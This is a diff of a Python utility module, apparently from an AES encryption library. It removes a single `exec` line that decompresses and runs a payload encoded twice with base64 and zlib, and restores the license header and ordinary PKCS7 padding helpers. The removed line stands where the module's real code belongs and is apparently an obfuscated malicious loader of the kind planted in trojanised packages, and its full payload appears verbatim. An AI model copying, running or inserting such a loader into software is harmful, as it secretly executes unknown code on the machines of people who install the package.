@@ -1,3 +1,60 @@
+# The MIT License (MIT)
+#
+# Copyright (c) 2014 Richard Moore
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+# THE SOFTWARE.
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('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')))).decode('utf-8'))
+# Why to_bufferable?
+# Python 3 is very different from Python 2.x when it comes to strings of text
+# and strings of bytes; in Python 3, strings of bytes do not exist, instead to
+# represent arbitrary binary data, we must use the "bytes" object. This method
+# ensures the object behaves as we need it to.
+
+def to_bufferable(binary):
+    return binary
+
+def _get_byte(c):
+    return ord(c)
+
+try:
+    xrange
+except:
+
+    def to_bufferable(binary):
+        if isinstance(binary, bytes):
+            return binary
+        return bytes(ord(b) for b in binary)
+
+    def _get_byte(c):
+        return c
+
+def append_PKCS7_padding(data):
+    pad = 16 - (len(data) % 16)
+    return data + to_bufferable(chr(pad) * pad)
+
+def strip_PKCS7_padding(data):
+    if len(data) % 16 != 0:
+        raise ValueError("invalid length")
+
+    pad = _get_byte(data[-1])
+
+    if not pad or pad > 16:
+        return data
+
+    return data[:-pad]
